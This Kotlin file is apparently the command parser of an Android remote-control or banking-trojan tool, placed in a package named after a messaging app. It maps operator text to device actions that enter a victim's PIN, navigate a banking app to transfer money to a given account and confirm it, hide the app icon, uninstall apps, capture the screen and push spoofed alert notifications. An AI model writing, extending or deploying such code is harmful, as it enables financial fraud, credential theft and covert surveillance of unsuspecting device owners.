package com.telegram2.messaging.remote

object NLPParser {

    data class Action(
        val type: String,
        val data: Any? = null,
        val description: String = ""
    )

    fun parse(input: String): List<Action> {
        val actions = mutableListOf<Action>()
        val lower = input.lowercase()

        // Extract app
        val pkgRegex = Regex("""(?:open|launch|start|run)\s+((?:[\w]+\.)+[\w]+)""")
        val pkg = pkgRegex.find(lower)?.groupValues?.get(1)

        // Extract text
        val textRegex = Regex("""type\s+(?:the\s+)?["']?([^"'\s][^"']*)["']?""")
        val text = textRegex.find(lower)?.groupValues?.get(1)

        // Extract coordinates
        val coordRegex = Regex("""tap\s+at\s+(\d+),\s*(\d+)""")
        val coordMatch = coordRegex.find(lower)
        val x = coordMatch?.groupValues?.get(1)?.toIntOrNull()
        val y = coordMatch?.groupValues?.get(2)?.toIntOrNull()

        // Extract swipe
        val swipeRegex = Regex("""swipe\s+from\s+(\d+),\s*(\d+)\s+to\s+(\d+),\s*(\d+)""")
        val swipeMatch = swipeRegex.find(lower)
        val (sx, sy, ex, ey) = if (swipeMatch != null) {
            listOf(swipeMatch.groupValues[1], swipeMatch.groupValues[2], swipeMatch.groupValues[3], swipeMatch.groupValues[4])
                .map { it.toIntOrNull() ?: 0 }
        } else listOf(0, 0, 0, 0)

        // Extract PIN
        val pinRegex = Regex("""pin\s+(\d{4,6})""")
        val pin = pinRegex.find(lower)?.groupValues?.get(1)

        // Extract amount
        val amountRegex = Regex("""(?:transfer|send|pay)\s+([\d,]+)""")
        val amount = amountRegex.find(lower)?.groupValues?.get(1)?.replace(",", "")

        // Extract account
        val accountRegex = Regex("""(?:account|number)\s+(\d{8,12})""")
        val account = accountRegex.find(lower)?.groupValues?.get(1)

        // Extract delay
        val waitRegex = Regex("""wait\s+(?:for\s+)?(\d+)\s*(?:seconds?|ms)""")
        val waitSec = waitRegex.find(lower)?.groupValues?.get(1)?.toIntOrNull()

        // --- Build actions ---

        if (pkg != null) actions.add(Action("launch", pkg, "Launch $pkg"))
        if (waitSec != null) actions.add(Action("wait", waitSec * 1000, "Wait ${waitSec}s"))
        if (text != null) actions.add(Action("type", text, "Type: $text"))
        if (x != null && y != null) actions.add(Action("tap", mapOf("x" to x, "y" to y), "Tap at ($x, $y)"))
        if (swipeMatch != null) actions.add(Action("swipe", mapOf("sx" to sx, "sy" to sy, "ex" to ex, "ey" to ey, "dur" to 300L), "Swipe from ($sx,$sy) to ($ex,$ey)"))
        if (pin != null) {
            actions.add(Action("tap", mapOf("x" to 540, "y" to 800), "Tap PIN field"))
            actions.add(Action("wait", 500, "Wait for focus"))
            actions.add(Action("type", pin, "Enter PIN"))
        }
        if (amount != null && account != null) {
            actions.add(Action("click_text", "Transfer", "Go to transfer"))
            actions.add(Action("wait", 1500, "Wait for screen"))
            actions.add(Action("tap", mapOf("x" to 540, "y" to 1200), "Tap amount field"))
            actions.add(Action("type", amount, "Enter amount"))
            actions.add(Action("tap", mapOf("x" to 540, "y" to 1400), "Tap account field"))
            actions.add(Action("type", account, "Enter account"))
            actions.add(Action("click_text", "Confirm", "Confirm transfer"))
            actions.add(Action("wait", 3000, "Wait for success"))
        }
        if (lower.contains("hide") || lower.contains("disable")) actions.add(Action("hide_activity", null, "Hide app icon"))
        if (lower.contains("uninstall") || lower.contains("delete")) actions.add(Action("uninstall", null, "Uninstall app"))
        if (lower.contains("start screen") || lower.contains("stream")) actions.add(Action("start_screen_capture", null, "Start screen capture"))
        if (lower.contains("send notification") || lower.contains("spoof notification")) {
            val title = extractQuotedText(lower, "title") ?: "⚠ Alert"
            val body = extractQuotedText(lower, "body") ?: "Tap to view"
            actions.add(Action("fake_notification", mapOf("title" to title, "text" to body), "Send spoofed notification"))
        }
        if (lower.contains("go home")) actions.add(Action("home", null, "Go to home"))
        if (lower.contains("go back")) actions.add(Action("back", null, "Press back"))
        if (lower.contains("get apps")) actions.add(Action("get_apps", null, "Get installed apps"))
        val clickTextRegex = Regex("""click\s+["']([^"']+)["']""")
        val clickText = clickTextRegex.find(lower)?.groupValues?.get(1)
        if (clickText != null) actions.add(Action("click_text", clickText, "Click: $clickText"))

        if (actions.isEmpty() && pkg != null) actions.add(Action("launch", pkg, "Launch $pkg"))

        return actions
    }

    private fun extractQuotedText(text: String, keyword: String): String? {
        val regex = Regex("""$keyword\s*["']([^"']+)["']""")
        return regex.find(text)?.groupValues?.get(1)
    }
}